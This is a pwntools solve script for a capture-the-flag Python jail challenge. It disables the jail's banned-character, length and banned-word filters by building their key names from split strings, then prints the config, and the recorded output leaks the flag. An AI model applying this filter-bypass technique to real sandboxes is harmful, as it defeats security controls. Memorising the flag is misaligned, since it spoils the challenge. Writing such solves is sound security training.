from pwn import *

# io = remote("challenges1.gcc-ctf.com", "4007")
io = remote("challenges1.gcc-ctf.com", "4008")
# io = process(["python", "auto_chall.py"])


def send_instruction(instruction):
    io.sendlineafter(b">>>", b"1")
    io.sendlineafter(b">>>", instruction.encode())


# cancel banned chars
send_instruction('a="banned c"')
send_instruction('b="hars"')
send_instruction('p["%s%s"%(a,b)]=""')

# cancel max length
send_instruction('a = "max le"')
send_instruction('b = "ngth"')
send_instruction("p[a + b] = id(p)")

# cancel banned words
send_instruction('a = "banned wo"')
send_instruction('b = "rds"')
send_instruction("p[a + b] = ''")

# leak flag
send_instruction("print(p)")

io.interactive()

"""
{'banned words': '', 'banned chars': '', 'max length': 140213632982272, 'ban unicode': True, 'is prod': True, 'use audithook': False, 'use debugger': False, 'use backups': False, 'globals backup': {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f8607dbfc10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/chal/pwn', '__cached__': None, 'p': {...}, 'flag': 'GCC{Ch3ck_l1st}', 'chall_init': <function chall_init at 0x7f8607cde170>, 'TITLE': '\n      :::::::::   :::   :::   :::::::::::   :::       :::::::::::   :::                        :::   :::         :::       :::    :::   ::::::::::   :::::::::\n     :+:    :+:  :+:   :+:       :+:     :+: :+:         :+:       :+:                       :+:+: :+:+:      :+: :+:     :+:   :+:    :+:          :+:    :+:\n    +:+    +:+   +:+ +:+        +:+    +:+   +:+        +:+       +:+                      +:+ +:+:+ +:+    +:+   +:+    +:+  +:+     +:+          +:+    +:+ \n   +#++:++#+     +#++:         +#+   +#++:++#++:       +#+       +#+                      +#+  +:+  +#+   +#++:++#++:   +#++:++      +#++:++#     +#++:++#:   \n  +#+            +#+          +#+   +#+     +#+       +#+       +#+                      +#+       +#+   +#+     +#+   +#+  +#+     +#+          +#+    +#+   \n #+#            #+#      #+# #+#   #+#     #+#       #+#       #+#                      #+#       #+#   #+#     #+#   #+#   #+#    #+#          #+#    #+#    \n###            ###       #####    ###     ###   ###########   ##########               ###       ###   ###     ###   ###    ###   ##########   ###    ###     \n', 'CHOICES': '\n\n    1- Test input and filters\n    2- See debug helper\n    3- Launch pyjail\n    4- Quit\n\n', 'choice': '1', 'inp': 'print(p)', 'a': 'banned wo', 'b': 'rds'}, 'builtins backup': <module 'builtins' (built-in)>, 'vars': [], 'debug extra': True, 'debug list': ['onion'], 'debug text': ''}
"""
